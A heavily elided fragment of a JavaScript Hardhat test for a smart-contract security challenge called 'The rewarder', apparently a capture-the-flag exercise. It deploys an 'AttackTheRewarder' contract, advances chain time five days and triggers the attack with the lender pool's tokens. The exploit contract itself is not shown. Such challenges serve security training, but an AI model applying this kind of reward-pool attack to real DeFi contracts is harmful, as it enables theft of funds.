...
describe('[Challenge] The rewarder', function () {
  ...
  it('Execution', async function () {
    ...
    const AttackTheRewarder = await ethers.getContractFactory('AttackTheRewarder', attacker);
    this.attackTheRewarder = await AttackTheRewarder.deploy(
    ...
    await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
    await this.attackTheRewarder.connect(attacker).attack(TOKENS_IN_LENDER_POOL);
  });
